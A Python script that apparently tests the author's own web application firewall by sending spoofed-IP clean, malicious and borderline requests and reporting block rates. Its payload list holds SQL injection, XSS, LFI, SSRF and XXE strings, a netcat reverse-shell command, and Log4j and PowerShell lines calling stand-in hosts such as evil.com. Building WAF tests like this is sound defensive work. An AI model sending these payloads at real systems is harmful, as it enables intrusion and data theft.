#!/usr/bin/env python3
"""
Multi-IP WAF traffic generator.

Spoofs many client IPs via X-Forwarded-For and fires a mix of clean,
clearly-malicious, and gray-zone payloads at the WAF. Useful for:

  - Smoke-testing the rule engine after changes
  - Seeding the dashboard with realistic-looking traffic
  - Triggering the ML gray-zone path (rule score 4.0–5.0)
  - Exercising rate-limit per-IP buckets

Examples:
    # default — one round against the local WAF (http://localhost:8080)
    python test_multi_ips.py

    # run THROUGH the public Cloudflare tunnel (auto-discovers the URL)
    python test_multi_ips.py --tunnel

    # three rounds, slower, reproducible seed
    python test_multi_ips.py --rounds 3 --delay 0.2 --seed 42

    # only clean traffic (for dashboard smoke testing)
    python test_multi_ips.py --no-attacks

    # rate-limit burst from a single IP
    python test_multi_ips.py --burst 10.0.0.99 --burst-count 200

    # explicit endpoint (e.g. a fixed tunnel/domain)
    python test_multi_ips.py --url https://waf.example.com
"""

from __future__ import annotations

import argparse
import os
import random
import re
import sys
import time
from collections import Counter, defaultdict
from dataclasses import dataclass, field
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# --- Simulated client IPs -------------------------------------------------

NORMAL_IPS = ["192.168.1.101", "192.168.1.102", "10.0.0.5"]
SUSPICIOUS_IPS = ["203.0.113.1", "203.0.113.2"]
ATTACKER_IPS = ["198.51.100.10", "198.51.100.11", "198.51.100.12"]
ALL_IPS = NORMAL_IPS + SUSPICIOUS_IPS + ATTACKER_IPS


# --- Payloads -------------------------------------------------------------

NORMAL_PATHS = [
    "/", "/about", "/contact", "/products", "/login",
    "/search?q=apple", "/blog", "/api/users", "/api/health-page",
]

# High-confidence attacks — score ≥ 5 from rules alone.
ATTACKS: dict[str, list[str]] = {
    "SQLi":      ["/?id=1 OR 1=1",
                  "/?q=' UNION SELECT username, password FROM users--",
                  "/?id=1; DROP TABLE users--"],
    "XSS":       ["/?search=<script>alert(1)</script>",
                  "/?q=<img src=x onerror=alert(1)>",
                  "/?redirect=javascript:alert('XSS')"],
    "RCE":       ["/?cmd=cat /etc/passwd",
                  "/?q=| whoami",
                  "/?file=; netcat -e /bin/sh 10.0.0.1 8080"],
    "LFI":       ["/../../etc/passwd",
                  "/?file=../../../../windows/win.ini",
                  "/?page=php://filter/convert.base64-encode/resource=index.php"],
    "SSRF":      ["/?url=http://127.0.0.1:8080/admin",
                  "/?webhook=http://169.254.169.254/latest/meta-data/",
                  "/?image=file:///etc/passwd"],
    "XXE":       ["/?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
                  "/?data=<!ENTITY % xxe SYSTEM 'http://evil.com/xxe'>%xxe;"],
    "NoSQLi":    ["/?user[$ne]=null&pass[$ne]=null",
                  "/?q={$where: 'this.password.length > 0'}"],
    "Log4j":     ["/?q=${jndi:ldap://evil.com/x}",
                  "/?user=${jndi:dns://attacker.com/leak}"],
    "Shellshock":["/?ua=() { :;}; /bin/bash -c 'sleep 5'"],
    "WinRCE":    ["/?cmd=cmd.exe /c dir",
                  "/?exec=powershell.exe -Command 'Invoke-WebRequest evil.com'"],
    "Sensitive": ["/.env", "/.git/config", "/wp-config.php"],
}

# Gray-zone payloads — designed to land in [4.0, 5.0) so the ML model
# decides. The XSS event-handler rule has anomaly=4 × multiplier=1.2 = 4.8.
GRAY_ZONE = [
    "/?p=onclick=window",
    "/?msg=hello%20onload=x",
    "/?x=onerror=alert",
]


# --- Stats ----------------------------------------------------------------

@dataclass
class Stats:
    sent: int = 0
    blocked: int = 0
    challenged: int = 0
    allowed: int = 0
    errors: int = 0
    by_ip: Counter = field(default_factory=Counter)
    blocked_by_ip: Counter = field(default_factory=Counter)
    by_category: Counter = field(default_factory=Counter)
    blocked_by_category: Counter = field(default_factory=Counter)
    waf_status: Counter = field(default_factory=Counter)
    latency_ms: list = field(default_factory=list)


# --- HTTP -----------------------------------------------------------------

STATUS_ICON = {200: "✓", 403: "✗", 429: "⚠", 500: "?"}


REQUEST_DELAY = 0.1


def send(session: requests.Session, base_url: str, ip: str, path: str,
         category: str, stats: Stats, *, ua: Optional[str] = None,
         timeout: float = 5.0) -> None:
    headers = {
        "X-Forwarded-For": ip,
        "User-Agent": ua or "MultiIPTester/2.0",
    }
    url = base_url.rstrip("/") + path
    started = time.perf_counter()
    try:
        resp = session.get(url, headers=headers, timeout=timeout, verify=False,
                           allow_redirects=False)
        elapsed = (time.perf_counter() - started) * 1000
        stats.latency_ms.append(elapsed)
        stats.sent += 1
        stats.by_ip[ip] += 1
        stats.by_category[category] += 1

        waf_status = resp.headers.get("X-WAF-Status", "")
        stats.waf_status[waf_status or "—"] += 1

        if resp.status_code == 403:
            stats.blocked += 1
            stats.blocked_by_ip[ip] += 1
            stats.blocked_by_category[category] += 1
            decision = "BLOCK"
        elif resp.status_code == 429:
            stats.challenged += 1
            decision = "RATE_LIMIT"
        elif 200 <= resp.status_code < 400:
            stats.allowed += 1
            decision = "ALLOW"
        elif resp.status_code in (502, 503, 504):
            # Upstream offline isn't a WAF result — count as allowed (passed
            # the WAF, failed to reach the backend) so the summary stays honest.
            stats.allowed += 1
            decision = "PROXY_ERR"
        else:
            stats.errors += 1
            decision = f"HTTP {resp.status_code}"

        icon = STATUS_ICON.get(resp.status_code, "·")
        snippet = path if len(path) <= 64 else path[:61] + "..."
        print(f"  {icon} {ip:>15s}  {category:<10s}  {resp.status_code:>3d}  "
              f"{decision:<10s}  {snippet}")

    except requests.exceptions.RequestException as e:
        stats.errors += 1
        print(f"  ! {ip:>15s}  {category:<10s}  ERR  {e.__class__.__name__}")
    finally:
        if REQUEST_DELAY > 0:
            time.sleep(REQUEST_DELAY)


# --- Strategies -----------------------------------------------------------

def round_normal(session, base_url, ip, stats):
    paths = random.sample(NORMAL_PATHS, k=min(3, len(NORMAL_PATHS)))
    for p in paths:
        send(session, base_url, ip, p, "normal", stats)


def round_suspicious(session, base_url, ip, stats):
    """Mostly normal with one gray-zone request — exercises ML path."""
    for p in random.sample(NORMAL_PATHS, k=2):
        send(session, base_url, ip, p, "normal", stats)
    send(session, base_url, ip, random.choice(GRAY_ZONE), "gray-zone", stats)


def round_attacker(session, base_url, ip, stats):
    """Mix of normal cover + 3 random attack categories + maybe scanner UA."""
    for p in random.sample(NORMAL_PATHS, k=1):
        send(session, base_url, ip, p, "normal", stats)
    for cat in random.sample(list(ATTACKS.keys()), k=3):
        send(session, base_url, ip, random.choice(ATTACKS[cat]), cat, stats)
    if random.random() > 0.5:
        send(session, base_url, ip, "/", "scanner", stats, ua="sqlmap/1.4.7")


def burst(session, base_url, ip, count, stats):
    """Slam a single IP at the WAF to trip the rate limiter."""
    print(f"\n=== Burst: {count} requests from {ip} ===")
    for i in range(count):
        send(session, base_url, ip, f"/?n={i}", "burst", stats)


# --- Reporting ------------------------------------------------------------

def print_summary(stats: Stats) -> None:
    lat = stats.latency_ms
    avg = sum(lat) / len(lat) if lat else 0
    p95 = sorted(lat)[int(len(lat) * 0.95)] if lat else 0

    bar = "─" * 56
    print(f"\n{bar}")
    print("Summary")
    print(bar)
    print(f"  Sent       : {stats.sent}")
    print(f"  Blocked    : {stats.blocked}  "
          f"({100 * stats.blocked / stats.sent:.1f}%)" if stats.sent else "")
    print(f"  Challenged : {stats.challenged}")
    print(f"  Allowed    : {stats.allowed}")
    print(f"  Errors     : {stats.errors}")
    print(f"  Latency    : avg {avg:.1f} ms  /  p95 {p95:.1f} ms")

    if stats.by_category:
        print(f"\n  {'Category':<14s}{'Sent':>6s}{'Blocked':>10s}  Block rate")
        print("  " + "-" * 46)
        for cat, n in stats.by_category.most_common():
            blk = stats.blocked_by_category.get(cat, 0)
            rate = f"{100 * blk / n:.0f}%" if n else "—"
            print(f"  {cat:<14s}{n:>6d}{blk:>10d}  {rate:>9s}")

    if stats.by_ip:
        print(f"\n  {'IP':<18s}{'Sent':>6s}{'Blocked':>10s}  Block rate")
        print("  " + "-" * 46)
        for ip, n in stats.by_ip.most_common():
            blk = stats.blocked_by_ip.get(ip, 0)
            rate = f"{100 * blk / n:.0f}%" if n else "—"
            print(f"  {ip:<18s}{n:>6d}{blk:>10d}  {rate:>9s}")

    if stats.waf_status:
        print("\n  X-WAF-Status header distribution:")
        for s, n in stats.waf_status.most_common():
            print(f"    {s:<12s}{n:>5d}")
    print(bar)


# --- Tunnel discovery -----------------------------------------------------

# Default place the `cloudflared tunnel --url ...` output is logged when started
# per docs/DEMO_JUICESHOP.md / the deploy guide.
DEFAULT_TUNNEL_LOG = "/tmp/cf_tunnel.log"
_TRYCF_RE = re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com")


def discover_tunnel_url(log_path: str) -> Optional[str]:
    """Find the active public Cloudflare tunnel URL.

    Resolution order:
      1. $WAF_TUNNEL_URL — an explicit override (e.g. a named tunnel / domain).
      2. The last trycloudflare.com URL printed in the cloudflared log file
         (quick tunnels print a fresh random URL on every start).
    Returns None if nothing is found.
    """
    env = os.environ.get("WAF_TUNNEL_URL")
    if env:
        return env.rstrip("/")
    try:
        with open(log_path, "r", encoding="utf-8", errors="ignore") as fh:
            matches = _TRYCF_RE.findall(fh.read())
        if matches:
            return matches[-1].rstrip("/")
    except OSError:
        pass
    return None


# --- Entry point ----------------------------------------------------------

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Multi-IP WAF traffic generator")
    p.add_argument("--url", default="http://localhost:8080",
                   help="WAF base URL (default: %(default)s)")
    p.add_argument("--tunnel", action="store_true",
                   help="Target the public Cloudflare tunnel instead of --url "
                        "(auto-discovers the URL from $WAF_TUNNEL_URL or the "
                        "cloudflared log)")
    p.add_argument("--tunnel-log", default=DEFAULT_TUNNEL_LOG,
                   help="cloudflared log file to read the tunnel URL from "
                        "(default: %(default)s)")
    p.add_argument("--rounds", type=int, default=1,
                   help="Repeat the IP loop this many times")
    p.add_argument("--delay", type=float, default=0.1,
                   help="Seconds to sleep between requests")
    p.add_argument("--ip-delay", type=float, default=0.5,
                   help="Seconds to sleep between IPs")
    p.add_argument("--seed", type=int, default=None,
                   help="Random seed for reproducible runs")
    p.add_argument("--no-attacks", action="store_true",
                   help="Send only normal traffic")
    p.add_argument("--burst", metavar="IP",
                   help="Run a rate-limit burst from this IP and exit")
    p.add_argument("--burst-count", type=int, default=150,
                   help="Number of requests in the burst")
    return p.parse_args()


def precheck(base_url: str) -> bool:
    try:
        requests.get(base_url, timeout=2, verify=False, allow_redirects=False)
        return True
    except requests.exceptions.RequestException as e:
        print(f"Error: cannot reach {base_url} ({e.__class__.__name__})")
        print("Hint: is the WAF running? `make run` to start it.")
        return False


def main() -> int:
    args = parse_args()
    if args.seed is not None:
        random.seed(args.seed)

    global REQUEST_DELAY
    REQUEST_DELAY = max(0.0, args.delay)

    # When --tunnel is set, resolve the public Cloudflare URL and override
    # args.url so the rest of main() (precheck, sends, summary) is unchanged.
    if args.tunnel:
        tunnel_url = discover_tunnel_url(args.tunnel_log)
        if not tunnel_url:
            print("Error: --tunnel set but no tunnel URL found.")
            print(f"Hint: start one with  cloudflared tunnel --url "
                  f"http://localhost:8080 > {args.tunnel_log} 2>&1 &")
            print("      or export WAF_TUNNEL_URL=https://<your>.trycloudflare.com")
            return 1
        args.url = tunnel_url
        print(f"Tunnel: {args.url}  (public Cloudflare)")

    if not precheck(args.url):
        return 1

    stats = Stats()
    session = requests.Session()

    print(f"Target: {args.url}")
    if args.seed is not None:
        print(f"Seed:   {args.seed}")
    print()

    if args.burst:
        # Sleeping between burst requests would defeat the purpose of
        # actually trying to trip the rate limiter.
        REQUEST_DELAY = 0.0
        burst(session, args.url, args.burst, args.burst_count, stats)
        print_summary(stats)
        return 0

    for r in range(args.rounds):
        if args.rounds > 1:
            print(f"\n=== Round {r + 1}/{args.rounds} ===")

        ips = ALL_IPS.copy()
        random.shuffle(ips)
        for ip in ips:
            if ip in ATTACKER_IPS and not args.no_attacks:
                kind, fn = "attacker", round_attacker
            elif ip in SUSPICIOUS_IPS and not args.no_attacks:
                kind, fn = "suspicious", round_suspicious
            else:
                kind, fn = "normal", round_normal
            print(f"\n→ {ip}  [{kind}]")
            fn(session, args.url, ip, stats)
            time.sleep(args.ip_delay)

    print_summary(stats)
    return 0


if __name__ == "__main__":
    sys.exit(main())
